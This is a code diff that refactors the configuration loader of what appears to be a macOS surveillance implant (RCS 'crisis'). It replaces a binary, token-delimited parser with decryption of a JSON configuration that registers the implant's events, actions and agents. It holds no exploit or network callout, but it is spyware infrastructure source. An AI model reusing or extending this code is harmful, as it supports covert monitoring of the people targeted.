@@ -18,6 +18,8 @@
 #import "RCSMEncryption.h"
 #import "RCSMCommon.h"
 #import "RCSMUtils.h"
+#import "RCSMDiskQuota.h"
+#import "RCSIJSonConfiguration.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -26,12 +28,6 @@
 #pragma mark -
 #pragma mark Private Interface
 #pragma mark -
-
-//
-// This is always because of our wonderful (btw do we really need to change it?)
-// configuration file.
-//
-static int actionCounter = 0;
 
 @interface RCSMConfManager (hidden)
 
@@ -160,18 +156,16 @@ static int actionCounter = 0;
               
               [taskManager registerAction: tempData
                                      type: header->type
-                                   action: actionCounter];
+                                   action: i];
             }
           else
             {
               [taskManager registerAction: nil
                                      type: header->type
-                                   action: actionCounter];
+                                   action: i];
               
               pos += sizeof(int) << 1;
             }
-          
-          actionCounter++;
         }
     }
   
@@ -205,7 +199,7 @@ static int actionCounter = 0;
   {
     for (int i=0; i<crisis_conf->network_process_count; i++) 
     {
-      int len = _utf16len((unichar*)process_name)*sizeof(unichar);
+      int len = _utf16len((unichar*)process_name) * sizeof(unichar);
       
   #ifdef DEBUG_CONF_MANAGER
       NSData *tmpD = [[NSData alloc] initWithBytes: process_name length: 8];
@@ -338,6 +332,9 @@ static int actionCounter = 0;
                                         andStatus: header->status];
             }
           
+#ifdef DEBUG_CONF_MANAGER
+          verboseLog(@"agent 0x%x: %@", header->agentID, tempData);
+#endif
           [taskManager registerAgent: tempData
                              agentID: header->agentID
                               status: header->status];
@@ -372,11 +369,13 @@ static int actionCounter = 0;
   if (self != nil)
     {
 #ifdef DEV_MODE
-      unsigned char result[CC_MD5_DIGEST_LENGTH];
-      CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
-
-      NSData *temp = [NSData dataWithBytes: result
-                                    length: CC_MD5_DIGEST_LENGTH];
+//      unsigned char result[CC_MD5_DIGEST_LENGTH];
+//      CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
+//
+//      NSData *temp = [NSData dataWithBytes: result
+//                                    length: CC_MD5_DIGEST_LENGTH];
+    NSData *temp = [NSData dataWithBytes: gConfAesKey
+                                  length: CC_MD5_DIGEST_LENGTH];
 #else
       NSData *temp = [NSData dataWithBytes: gConfAesKey
                                     length: CC_MD5_DIGEST_LENGTH];
@@ -397,240 +396,65 @@ static int actionCounter = 0;
 
 - (BOOL)loadConfiguration
 {
-  actionCounter = 0;
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
   
   NSString *configurationFile = [[NSString alloc] initWithFormat: @"%@/%@",
                                  [[NSBundle mainBundle] bundlePath],
                                  gConfigurationName];
   
-  if ([[NSFileManager defaultManager] fileExistsAtPath: configurationFile])
+  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
+  
+  [configurationFile release];
+  
+  if (configuration == nil)
     {
-      int numberOfOccurrences;
-      NSData *configuration = [mEncryption decryptConfiguration: configurationFile];
-      
-      [configurationFile release];
-      
-      if (configuration != nil)
-        {
-          RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
-          
-          //
-          // For safety we remove all the previous objects
-          //
-          [taskManager removeAllElements];
-          
-#ifdef DEBUG_CONF_MANAGER
-          [configuration writeToFile: @"/tmp/conf_decrypted.bin"
-                          atomically: YES];
-#endif
-          
-          int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
-          int endOfConfData;
-          
-          [configuration getBytes: &endOfConfData
-                            range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
-          
-          // Exclude sizeof(Final CRC) + sizeof(LEN field)
-          endOfConfData = endOfConfData - sizeof(int) * 2;
-          
-          @try
-            {
-              mConfigurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
-                                                                                endOfConfData)];
-            }
-          @catch (NSException *e)
-            {
-#ifdef DEBUG_CONF_MANAGER
-              errorLog(@"%s exception", __FUNCTION__);
-#endif
-              
-              return NO;
-            }
-          
-          u_long pos = 0;
-          int offsetActions = 0;
-          
-          if ([self _searchDataForToken: mConfigurationData
-                                  token: EVENT_CONF_DELIMITER
-                               position: &pos] == YES)
-            {
-              // Skip the EVENT Token + \00
-              pos += strlen(EVENT_CONF_DELIMITER) + 1;
-              
-              //
-              // Read num of events
-              //
-              [mConfigurationData getBytes: &numberOfOccurrences
-                                     range: NSMakeRange(pos, sizeof(int))];
-#ifdef DEBUG_CONF_MANAGER
-              verboseLog(@"Parsing (%d) Events at offset (%x)", numberOfOccurrences, pos);
-#endif
-              // Skip numberOfEvents (DWORD)
-              pos += sizeof(int);
-              NSData *tempData;
-              
-              @try
-                {
-                  tempData = [mConfigurationData subdataWithRange:
-                              NSMakeRange(pos, endOfConfData - pos)];
-                }
-              @catch (NSException *e)
-                {
-#ifdef DEBUG_CONF_MANAGER
-                  errorLog(@"%s exception", __FUNCTION__);
-#endif
-                
-                  return NO;              
-                }
-              
-              offsetActions = [self _parseEvents: tempData nTimes: numberOfOccurrences];
-            }
-          else
-            {
-#ifdef DEBUG_CONF_MANAGER
-              errorLog(@"event - searchDataForToken sux");
-#endif
-              
-              return NO;
-            }
-          
-          //
-          // parseActions here since our wonderful/functional/flexible/extendible configuration
-          // file doesn't have an action header, obfuscation FTW
-          //
-#ifdef DEBUG_CONF_MANAGER
-          verboseLog(@"Offset: %x", offsetActions);
-#endif
-          // Read num of actions
-          [mConfigurationData getBytes: &numberOfOccurrences
-                                 range: NSMakeRange(offsetActions, sizeof(int))];
-#ifdef DEBUG_CONF_MANAGER
-          verboseLog(@"Parsing (%d) Actions at offset (%x)", numberOfOccurrences, offsetActions);
-#endif
-          // Skip numberOfActions (DWORD)
-          offsetActions += sizeof(int);
-          NSData *tempData;
-          
-          @try
-            {
-              tempData = [mConfigurationData subdataWithRange:
-                          NSMakeRange(offsetActions, endOfConfData - offsetActions)];
-            }
-          @catch (NSException *e)
-            {
-#ifdef DEBUG_CONF_MANAGER
-              errorLog(@"%s exception", __FUNCTION__);
-#endif
-          
-              return NO;              
-            }
-          
-          //infoLog(@"actions %@", tempData);
-          [self _parseActions: tempData nTimes: numberOfOccurrences];
-          
-          if ([self _searchDataForToken: mConfigurationData
-                                  token: AGENT_CONF_DELIMITER
-                               position: &pos] == YES)
-            {
-              // Skip the EVENT Token + \00
-              pos += strlen(AGENT_CONF_DELIMITER) + 1;
-              
-              //
-              // Read num of agents
-              //
-              [mConfigurationData getBytes: &numberOfOccurrences
-                                     range: NSMakeRange(pos, sizeof(int))];
-#ifdef DEBUG_CONF_MANAGER
-              verboseLog(@"Parsing (%d) Agents at offset (%x)", numberOfOccurrences, pos);
-#endif
-              // Skip numberOfAgents (DWORD)
-              pos += sizeof(int);
-              NSData *tempData;
-              
-              @try
-                {
-                  tempData = [mConfigurationData subdataWithRange:
-                              NSMakeRange(pos, endOfConfData - pos)];
-                }
-              @catch (NSException *e)
-                {
-#ifdef DEBUG_CONF_MANAGER
-                  errorLog(@"%s exception", __FUNCTION__);
-#endif
-              
-                  return NO;              
-                }
-              
-              [self _parseAgents: tempData nTimes: numberOfOccurrences];
-            }
-          else
-            {
-#ifdef DEBUG_CONF_MANAGER
-              errorLog(@"agents - searchDataForToken sux");
-#endif
-              
-              return NO;
-            }
-        }
-      else
-        {
-          return NO;
-        }
-    }
-  else
-    {
-#ifdef DEBUG_CONF_MANAGER
-      errorLog(@"Configuration file not found @ %@", configurationFile);
-#endif
-      [configurationFile release];
-      
+      // FIXED-
+      [pool release];
       return NO;
     }
+    
+  // For safety we remove all the previous objects
+  [taskManager removeAllElements];
   
-  return YES;
+  SBJSonConfigDelegate *jSonDel = [[SBJSonConfigDelegate alloc] init];
+  
+  // Running the parser and populate the lists
+  BOOL bRet = [jSonDel runParser: configuration 
+                      WithEvents: [taskManager mEventsList] 
+                      andActions: [taskManager mActionsList] 
+                      andModules: [taskManager mAgentsList]];
+  
+  [jSonDel release];
+
+  //FIXED-
+  [configuration release];
+  
+  [pool release];
+  
+  return bRet;
 }
 
 - (BOOL)checkConfigurationIntegrity: (NSString *)configurationFile
 {
+  // FIXED-
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  BOOL rVal = NO;
-  int startOfConfData = TIMESTAMP_SIZE + sizeof(int);
-  int endOfConfData;
-  NSData *configuration = [mEncryption decryptConfiguration: configurationFile];
-  
-  [configuration getBytes: &endOfConfData
-                    range: NSMakeRange(TIMESTAMP_SIZE, sizeof(int))];
-  
-  // Exclude sizeof(Final CRC) + sizeof(LEN field)
-  endOfConfData = endOfConfData - sizeof(int) * 2;
-  NSData *configurationData = nil;
-  
-  @try
-    {
-      configurationData = [configuration subdataWithRange: NSMakeRange(startOfConfData,
-                                                                       endOfConfData)];
-    }
-  @catch (NSException *e)
-    {
-#ifdef DEBUG_CONF_MANAGER
-      errorLog(@"exception on configData makerange (%@)", [e reason]);
-#endif
-    }
 
+  // configuration retained by decryptJSonConfiguration
+  NSData *configuration = [mEncryption decryptJSonConfiguration: configurationFile];
   
-  u_long pos = 0;
-  
-  if ([self _searchDataForToken: configurationData
-                          token: ENDOF_CONF_DELIMITER
-                       position: &pos] == YES)
-    rVal = YES;
-  else 
-    rVal = NO;
+  if (configuration == nil) 
+    {
+      [pool release];
+      return NO;
+    }
+  else // FIXED-
+    [configuration release];
   
   [pool release];
   
-  return rVal;
+  return YES;
 }
 
 - (RCSMEncryption *)encryption
